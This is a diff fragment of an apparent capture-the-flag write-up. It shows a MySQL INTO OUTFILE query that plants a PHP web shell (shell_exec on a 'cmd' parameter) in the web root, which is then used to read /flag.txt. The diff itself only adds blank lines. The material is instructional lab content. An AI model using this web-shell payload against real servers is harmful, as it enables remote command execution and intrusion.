@@ -16,6 +16,8 @@ select '<?php $output=shell_exec($_GET["cmd"]);
 echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;
 ```
 This create a PHP file with cmd parameter that take value from input and parse it to shell_exec() function - a PHP function that executing shell command.
+
 3. With that parameter, you will get: `/shell.php?cmd=cat /flag.txt`.
+
 4. You get the flag.
 
